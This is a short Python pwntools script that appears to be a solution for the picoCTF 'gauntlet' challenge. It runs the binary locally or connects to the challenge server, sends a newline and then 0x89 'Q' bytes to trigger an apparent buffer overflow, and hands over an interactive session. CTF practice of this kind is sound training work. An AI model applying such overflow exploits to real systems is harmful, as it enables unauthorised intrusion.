#!/usr/bin/python3

from pwn import *
import sys

BIN = './gauntlet'

if len(sys.argv) > 1:
    r = remote('mercury.picoctf.net', 26184)
else:
    r = process(BIN)

r.send('\n')
r.send('Q'*0x89)

r.interactive()
